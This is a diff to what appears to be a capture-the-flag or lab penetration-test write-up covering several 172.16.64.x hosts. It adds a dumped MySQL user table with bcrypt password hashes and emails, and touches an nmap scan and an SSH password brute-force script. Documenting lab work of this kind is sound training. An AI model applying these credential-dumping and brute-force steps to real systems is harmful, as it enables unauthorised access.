@@ -42,7 +42,7 @@ nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A --open -oX portScan.xml
 
 ## Open Ports and Running Services
 
-### 172.16.64.81 \(Linux 3.16 - 95%\)
+### ✔️172.16.64.81 \(Linux 3.16 - 95%\)
 
 | Port | State | Service | Version |
 | :--- | :--- | :--- | :--- |
@@ -692,6 +692,21 @@ mysql --host=172.16.64.81 \
 {% endtab %}
 {% endtabs %}
 
+{% hint style="warning" %}
+**We find user credentials** on the `cmsbase.tbl_users` table:
+
+```text
+MySQL [cmsbase]> select user,password,name,email from tbl_users;
++---------+--------------------------------------------------------------+---------+-------------------+
+| user    | password                                                     | name    | email             |
++---------+--------------------------------------------------------------+---------+-------------------+
+| foocorp | $2a$08$f2fG8Ncpmj815xQ9U3Ylh.uD0VW/X6kOgjPIEHKP547jspS0FlHF6 | foocorp | admin@foocorp.io  |
+| mickey  | $2a$08$w/oljwDbODAThUR4HTVO8eUjTabE80sH0i6xnOR97ZXfsGGmxohAW | mickey  | mickey@foocorp.io |
+| donald  | $2a$08$dK04y0KEURxDv02vYRab1OMYMSWbW/bpGF.eAWrWv9JAGaa4yTxlq | donald  | donald@foocorp.io |
++---------+--------------------------------------------------------------+---------+-------------------+
+```
+{% endhint %}
+
 {% hint style="success" %}
 **Flag encountered!** 😁 
 
@@ -707,20 +722,6 @@ select * from flag;
 1 row in set (0.141 sec)
 ```
 {% endhint %}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ### 172.16.64.91 \(Linux 3.13 - 95%\)
 
@@ -850,7 +851,7 @@ Files found with a 200 responce:
 {% endtab %}
 {% endtabs %}
 
-### 172.16.64.166 \(Linux 3.12 - 95%\)
+### ✔️172.16.64.166 \(Linux 3.12 - 95%\)
 
 | Port | State | Service | Version |
 | :--- | :--- | :--- | :--- |
@@ -1164,7 +1165,7 @@ sabrina
 {% tab title="script.sh" %}
 ```bash
 #!/bin/sh
-# Brutefoce known users against SSH with password CHANGEME
+# Bruteforce known users against SSH with password CHANGEME
 
 for user in $(cat users.txt); 
 do
